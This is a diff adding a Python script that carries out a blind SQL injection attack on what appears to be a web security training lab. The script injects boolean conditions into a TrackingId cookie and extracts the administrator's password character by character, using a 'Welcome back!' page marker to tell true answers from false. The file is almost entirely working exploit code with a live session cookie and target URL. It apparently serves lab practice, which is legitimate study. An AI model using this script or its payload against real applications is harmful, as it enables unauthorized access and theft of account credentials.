@@ -1,0 +1,49 @@
+import requests
+import string
+
+url = "https://0ac1005c03a5a766802cfdec00540048.web-security-academy.net/login"
+
+session = requests.Session()
+
+# Replace these with your current lab cookies.
+session.cookies.set("session", "bMRU3HFHmgxTMgz8BVuGNsdY43AY15VJ")
+
+tracking_prefix = "QxSnizFOVc3M60NC"
+
+# Adjust this alphabet to match the lab's password format.
+alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits
+
+# Confirm this marker by comparing true and false conditions first.
+true_marker = "Welcome back!"
+
+password = ""
+
+for position in range(1, 30):
+    found = False
+
+    for char in alphabet:
+        condition = (
+            f"(SELECT SUBSTRING(password,{position},1) "
+            f"FROM users WHERE username='administrator')='{char}'"
+        )
+
+        tracking_id = tracking_prefix + "' AND " + condition + "-- "
+
+        response = session.get(
+            url,
+            cookies={"TrackingId": tracking_id},
+            timeout=10
+        )
+
+        if true_marker in response.text:
+            password += char
+            print(f"[+] Position {position}: {char}")
+            print(f"[+] Current password: {password}")
+            found = True
+            break
+
+    if not found:
+        print(f"[-] No matching character at position {position}.")
+        break
+
+print(f"\nResult: {password}")
